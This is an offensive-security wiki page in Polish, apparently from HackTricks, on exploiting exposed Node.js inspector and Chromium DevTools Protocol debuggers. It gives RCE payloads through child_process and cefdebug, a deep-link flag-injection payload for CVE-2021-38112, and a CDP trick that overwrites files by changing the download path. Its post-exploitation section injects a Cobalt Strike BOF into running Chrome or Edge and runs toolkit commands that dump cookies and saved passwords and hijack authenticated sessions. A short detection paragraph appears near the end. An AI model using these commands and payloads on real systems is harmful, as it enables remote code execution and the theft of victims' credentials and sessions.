# Nadużywanie debuggera Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Historyczne praktyczne przykłady obejmują przewodnik Multimaster i atak na debugger Visual Studio Code CVE-2019-1414; traktuj je jako kontekst dotyczący konkretnych wersji, zamiast zakładać, że każdy obecny cel oparty na Electron lub Chromium udostępnia te same mechanizmy.<sup>[[1]](#references)[[3]](#references)</sup>

## Podstawowe informacje

[Z dokumentacji](https://nodejs.org/learn/getting-started/debugging): Po uruchomieniu z przełącznikiem `--inspect` proces Node.js nasłuchuje na połączenia klienta debuggera. **Domyślnie** nasłuchuje na hoście i porcie **`127.0.0.1:9229`**. Każdemu procesowi przypisywany jest również **unikatowy** **UUID**.<sup>[[4]](#references)</sup>

Klienci Inspector muszą znać i podać adres hosta, port oraz UUID, aby nawiązać połączenie. Pełny URL będzie wyglądał mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Ponieważ **debugger ma pełny dostęp do środowiska wykonywania Node.js**, złośliwy podmiot, który może połączyć się z tym portem, może być w stanie wykonać dowolny kod w imieniu procesu Node.js (**potencjalna eskalacja uprawnień**).<sup>[[4]](#references)</sup>

Istnieje kilka sposobów uruchomienia Inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Po uruchomieniu procesu poddawanego inspekcji pojawi się coś takiego:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Procesy oparte na **CEF** (**Chromium Embedded Framework**) mogą udostępniać debugger z opcją `--remote-debugging-port=9222`. Udostępnia to przeglądarkę za pośrednictwem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a nie inspektora Node.js, więc payloady oparte na `process` w Node.js domyślnie nie mają tu bezpośredniego zastosowania.<sup>[[2]](#references)[[5]](#references)</sup>

Po uruchomieniu przeglądarki w trybie debugowania pojawi się coś takiego:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerowanie endpointu CDP i sterowanie nim

Endpointy HTTP do wykrywania rozróżniają WebSocket **browser** od WebSocketów poszczególnych **targetów** (kart, workerów, rozszerzeń itp.). Odpytaj `/json/version`, aby uzyskać endpoint browser, a `/json/list`, aby uzyskać targety; zwrócone wartości `webSocketDebuggerUrl` można następnie bezpośrednio obsługiwać za pomocą komunikatów przypominających JSON-RPC w CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Na przykład połącz się za pomocą `websocat "$BROWSER_WS"` i wyślij `{"id":1,"method":"Target.getTargets"}` lub `{"id":2,"method":"Storage.getCookies"}`. W przypadku page target (`websocat "$PAGE_WS"`) `Runtime.evaluate` wykonuje kod w rendererze, a `Page.captureScreenshot` zwraca zrzut ekranu zakodowany w base64. `document.cookie` nie ujawnia cookies `HttpOnly`, natomiast `Storage.getCookies` pobiera cookies z magazynu przeglądarki.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Przeglądarki, WebSockety i polityka tego samego pochodzenia <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w przeglądarce mogą wysyłać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest konieczne, aby **uzyskać unikatowy identyfikator sesji debuggera**. **Polityka tego samego pochodzenia** **uniemożliwia** stronom internetowym nawiązanie **tego połączenia HTTP**. Aby dodatkowo zabezpieczyć się przed [**atakami DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js sprawdza, czy nagłówki **'Host'** połączenia zawierają dokładnie **adres IP** lub **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Te **zabezpieczenia uniemożliwiają wykorzystanie inspectora** do uruchomienia kodu przez **samo wysłanie żądania HTTP** (co można zrobić, wykorzystując lukę SSRF).<sup>[[4]](#references)</sup>

### Uruchamianie inspectora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu Node.js, aby **uruchomić w nim inspector** na domyślnym porcie. Pamiętaj jednak, że potrzebujesz odpowiednich uprawnień. Może to więc dać Ci **uprzywilejowany dostęp do informacji w procesie**, ale nie prowadzi bezpośrednio do eskalacji uprawnień.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Jest to przydatne w kontenerach, ponieważ **zatrzymanie procesu i uruchomienie nowego** z `--inspect` **nie wchodzi w grę**, gdyż **kontener** zostanie **zatrzymany** wraz z procesem.<sup>[[6]](#references)</sup>

### Połącz się z inspector/debugger

Aby połączyć się z przeglądarką opartą na **Chromium**, można otworzyć adres `chrome://inspect` lub `edge://inspect`, odpowiednio dla Chrome lub Edge. Po kliknięciu przycisku Configure należy upewnić się, że na liście znajduje się właściwy **host i port docelowy**. Obraz przedstawia przykład zdalnego wykonania kodu (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Pojawi się adres URL umożliwiający dostęp do debuggera, np. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d — Połącz się z inspector/debugger: Aby połączyć się z przeglądarką opartą na Chromium, ...](<../../images/image (674).png>)

Z **wiersza poleceń** można połączyć się z debuggerem/inspector za pomocą:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) umożliwia **znajdowanie inspektorów** działających lokalnie i **wstrzykiwanie do nich kodu**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Pamiętaj, że **exploity RCE dla NodeJS nie zadziałają**, jeśli połączysz się z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (musisz sprawdzić API, aby znaleźć ciekawe rzeczy, które można z nim zrobić).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE w debuggerze/inspektorze NodeJS

> [!TIP]
> Jeśli szukasz informacji, jak uzyskać [**RCE z XSS w Electron, sprawdź tę stronę.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Niektóre typowe sposoby uzyskania **RCE**, gdy możesz **połączyć się** z inspektorem Node, polegają na użyciu czegoś takiego (wygląda na to, że **nie zadziała to w połączeniu z Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

API można sprawdzić tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
W tej sekcji wymienię tylko interesujące rzeczy, których — jak znalazłem — ludzie używali do exploitowania tego protokołu.

### Ograniczenie dotyczące domyślnego profilu w Chrome 136+

Począwszy od **Chrome 136**, Chrome ignoruje `--remote-debugging-port` i `--remote-debugging-pipe`, gdy wskazują one **domyślny katalog danych Chrome**. Taki przełącznik musi być użyty razem z niestandardowym `--user-data-dir`, którego osobny klucz szyfrowania i odizolowany stan przeglądarki uniemożliwiają prostej technice opartej na flagach ujawnienie normalnego, uwierzytelnionego profilu użytkownika. Nie należy zakładać, że to ograniczenie specyficzne dla Chrome obejmuje starsze wersje Chrome, Chrome for Testing, aplikacje Electron/CEF ani inne pochodne Chromium bez uprzedniej weryfikacji.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Dlatego samo zauważenie, że bieżący proces Chrome został uruchomiony z opcją `--remote-debugging-port`, **nie** dowodzi, że CDP stał się aktywny. Potwierdź działanie listenera i endpointu `/json/version`, a także ustal, który profil jest z nim powiązany.<sup>[[14]](#references)</sup>

### Wstrzykiwanie parametrów przez deep linki

W przypadku [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) badacze z Rhino Security odkryli, że aplikacja oparta na CEF **zarejestrowała w systemie niestandardowy URI** (`workspaces://index.html`), który otrzymywał pełny URI, a następnie **uruchamiał aplikację opartą na CEF** z konfiguracją częściowo konstruowaną na podstawie tego URI.<sup>[[8]](#references)</sup>

Odkryto, że parametry URI były dekodowane z formatu URL i używane do uruchamiania aplikacji opartej na CEF, co pozwalało użytkownikowi **wstrzyknąć** flagę **`--gpu-launcher`** do **wiersza poleceń** i wykonać dowolny kod.<sup>[[8]](#references)</sup>

A więc ładunek taki jak:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Uruchomi `calc.exe`.<sup>[[8]](#references)</sup>

### Nadpisywanie plików

Zmień folder, w którym **będą zapisywane pobrane pliki**, a następnie pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE i eksfiltracja przez WebDriver

STAR Labs wykazało, że udostępnione usługi WebDriver/CDP mogą umożliwiać dowolny odczyt plików i RCE; w niektórych konfiguracjach DNS rebinding może dopełnić łańcuch exploita.<sup>[[9]](#references)</sup>

Usługa WebDriver w ChromeDriver jest odrębna od Chrome DevTools/CDP. Możliwość [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) wskazuje plik wykonywalny przeglądarki uruchamianej dla nowej sesji. Jeśli nieuprzywilejowany użytkownik może uzyskać dostęp do usługi ChromeDriver działającej jako root i utworzyć sesję ze wskazaną przez siebie ścieżką pliku wykonywalnego, takie uruchomienie może przekroczyć granicę uprawnień usługi. Pusta odpowiedź `/sessions` nie rozstrzyga, czy można utworzyć nowe sesje. Przed stwierdzeniem, że ta ścieżka jest możliwa do wykorzystania, sprawdź właściciela procesu, rzeczywistą dostępność nasłuchującego portu, autoryzację sesji, dostęp do pliku wykonywalnego i mechanizmy izolacji; sama nazwa procesu lub typowy port nie wystarczą. [Wytyczne bezpieczeństwa Google](https://developer.chrome.com/docs/chromedriver/security-considerations) zalecają uruchamianie ChromeDriver na nieuprzywilejowanym koncie. Pasywne rozpoznanie nie powinno tworzyć sesji WebDriver.

Więcej historycznych przypadków związanych z automatyzacją przeglądarek i bezpieczeństwem Chromium opisują artykuł Counter WebDriver oraz zgłoszenia Project Zero 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Włączanie CDP w działającym procesie Chromium

Ograniczenie Chrome dotyczące domyślnego profilu blokuje jedynie aktywację z poziomu wiersza poleceń. Przy wystarczających uprawnieniach tego samego użytkownika do manipulowania procesem przeglądarki oryginalny [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) i [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) dla Cobalt Strike wywołują nieeksportowaną funkcję `content::DevToolsAgentHost::StartRemoteDebuggingServer` wewnątrz już działającego procesu `chrome.exe` lub `msedge.exe`. Punkt końcowy jest więc powiązany z rzeczywistym profilem i zachowuje jego karty, rozszerzenia, pliki cookie oraz uwierzytelniony stan.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

W przypadku typowych procesów x64 Chrome/Edge BOF wyszukuje okno przeglądarki i załadowany plik `chrome.dll`/`msedge.dll`, skanuje zdalny plik PE w poszukiwaniu sygnatur z maskami, przydziela pamięć na stuby i blok kontekstu, tymczasowo podmienia procedurę okna, a następnie wykonuje końcowe wywołanie w wątku **UI** przeglądarki. Odpowiednie dane wejściowe dostępne w czasie działania to `StartRemoteDebuggingServer`, `operator new` Chromium, `TCPServerSocketFactory::CreateForHttpServer` oraz tablica vtable fabryki. Wykonywanie zostaje przerwane, jeśli nie zostanie znalezione dokładnie jedno dopasowanie każdej wymaganej sygnatury.<sup>[[15]](#references)[[16]](#references)</sup>

BOF przyjmuje tryb przeglądarki i opcjonalny port. Następnie jego skrypt pomocniczy może zweryfikować punkt końcowy i zebrać pliki cookie; `chrome-iso` to odrębna ścieżka dotycząca granicy izolacji procesów Chrome w systemie Windows.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Ścieżka `chrome-iso` używa wyłącznie uchwytów do odizolowanego procesu z prawem ograniczonym do zapytań. Identyfikuje zainstalowany plik `chrome.dll`, którego rozmiar obrazu PE odpowiada rozmiarowi obrazu działającego procesu, rozwiązuje symbole z tego lokalnego obrazu i wykorzystuje mechanizm dispatch `WindowImpl` w Chromium, synchroniczny komunikat `WM_COPYDATA` oraz hook User32 w istniejącym obrazie, aby dotrzeć do wątku UI.<sup>[[16]](#references)</sup>

> [!WARNING]
> Jest to technika **manipulacji procesem przeglądarki po uzyskaniu do niego dostępu**, a nie obejście uwierzytelniania w sieci. Zależy od wersji kompilacji, ponieważ odpowiednie symbole C++ nie są eksportowane i mogą się zmieniać po aktualizacjach przeglądarki.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Odświeżanie sygnatur po aktualizacjach przeglądarki

Użyj dokładnej wersji pliku `chrome.dll` lub `msedge.dll` zainstalowanej na celu oraz odpowiadającego jej pliku PDB. `symchk.exe` z Windows SDK pobiera symbole; następnie skrypty repozytorium lokalizują `StartRemoteDebuggingServer`, ustalają parametry wejściowe alokatora/fabryki gniazd albo sprawdzają każdą sygnaturę osadzoną w BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Wyniku z zerową lub wieloma trafieniami nie wolno zastępować dowolnym adresem. Jeśli znany wzorzec `operator new` lub `CreateForHttpServer` zmienił się na tyle, że nie można na jego podstawie utworzyć nowej maski, użyj `pe_signature_finder.py` z plikiem PDB, aby zbadać ten symbol i wyznaczyć sekwencję bajtów unikalną w docelowym module.<sup>[[16]](#references)[[18]](#references)</sup>

#### Ekstrakcja z uwierzytelnionej przeglądarki za pomocą CDP Toolkit

Ta technika nie odszyfrowuje offline App-Bound Encryption (ABE) ani nie usuwa powiązania z urządzeniem. Zamiast tego traktuje legalnie działającą przeglądarkę jako **wyrocznię deszyfrującą i uwierzytelnione proxy do interakcji**: `Storage.getCookies` pobiera pliki cookie z pamięci przeglądarki, a przepływy pracy obejmujące nawigację i screencast pozostawiają żądania, pamięć masową, uwierzytelnianie firmowe i zachowanie powiązane z urządzeniem w istniejącej przeglądarce ofiary.<sup>[[17]](#references)[[18]](#references)</sup>

Po przekierowaniu nasłuchującego lokalnie CDP przez pivot operatora narzędzie [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) może wyliczyć i zebrać typowe artefakty.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` i `tabs screenshot` to głównie wrappery dla `/json/version`, listy targetów, `Storage.getCookies` i `Page.captureScreenshot`. Historia, zakładki, rozszerzenia i metadane haseł wymagają natomiast tymczasowego targetu `chrome://`/`edge://` WebUI: toolkit czeka na wyrenderowanie interfejsu, sprawdza jego model lub DOM, zbiera wynik i zamyka target.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` idzie dalej: otwiera oryginalną domenę zapisanego loginu, ustawia fokus na polu poświadczeń, wybiera natywną sugestię autouzupełniania za pomocą zdarzeń wejściowych CDP i odczytuje wypełnione wartości. Domena/port/ścieżka muszą ściśle odpowiadać realmowi zapisanego hasła; tryb widoczny jest domyślnym, niezawodnym wyborem, ponieważ okno sugestii jest natywnym interfejsem przeglądarki.<sup>[[17]](#references)[[18]](#references)</sup>

Do interakcji na żywo `browser-takeover screencast` przesyła klatki i wysyła dane wejściowe do rzeczywistego targetu (również w trybie działania w tle lub poza ekranem). `browser-takeover proxy` zamiast tego lokalnie akceptuje HTTP i HTTPS `CONNECT` oraz wysyła żądania do serwerów upstream za pośrednictwem ukrytych targetów Chrome; gdy ukryte targety są niedostępne, korzysta z kart działających w tle. Zachowuje to kontekst sieciowy/uwierzytelniania ofiary, ale jest mniej wierne w przypadku złożonych aplikacji po stronie klienta, ponieważ przeglądarka operatora renderuje zwróconą treść.<sup>[[17]](#references)[[18]](#references)</sup>

W celu wykrywania nie polegaj wyłącznie na telemetrii wiersza poleceń `--remote-debugging-*`: koreluj także nietypowe uchwyty i operacje na pamięci dotyczące procesów przeglądarki (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, tworzenie wątków), wstrzykiwanie DLL oraz nieoczekiwane nasłuchujące gniazda loopback należące do Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-eksploatacja

W rzeczywistym środowisku, **po skompromitowaniu** komputera użytkownika korzystającego z przeglądarki opartej na Chromium, historycznie stosowaną techniką było ponowne uruchomienie przeglądarki z włączonym debugowaniem i przekierowanie portu loopback. Może to ujawnić stan przeglądania ofiary w produktach/kompilacjach, które nadal akceptują wybrany profil, ale Chrome 136+ nie zastosuje tej metody do domyślnego katalogu danych.<sup>[[7]](#references)[[14]](#references)</sup>

Pierwotne polecenie ponownego uruchomienia znajduje się poniżej i jest przeznaczone dla starszych lub określonych wersji targetów. Drugie polecenie to obsługiwana obecnie forma dla Chrome, ale tworzy odizolowany profil zamiast ponownie otwierać zwykły, uwierzytelniony stan ofiary.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

W przypadku specyficznych dla macOS technik ponownego uruchamiania Chromium, rozszerzeń i CDP zobacz [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Narzędzie do inspekcji i exploitacji debuggera CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Zdalne wykonanie kodu w Visual Studio Code za pośrednictwem debuggera Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Przewodnik debugowania Node.js - Pierwsze kroki](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Wykorzystanie funkcji debugowania Chrome do zdalnej obserwacji i kontroli sesji przeglądania](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Zdalne wykonanie kodu w AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Mówisz do mnie? - RCE w WebDriver za pośrednictwem DNS Rebinding i CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Od bota do RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (rejestr błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (rejestr błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (rejestr błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Zmiany przełączników zdalnego debugowania w celu poprawy bezpieczeństwa - Chrome dla programistów](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Wstrzykiwanie CDP do uruchomionej przeglądarki Edge: szczegółowe omówienie instrumentacji środowiska uruchomieniowego przeglądarki](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Powrót Cookie Monstera](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
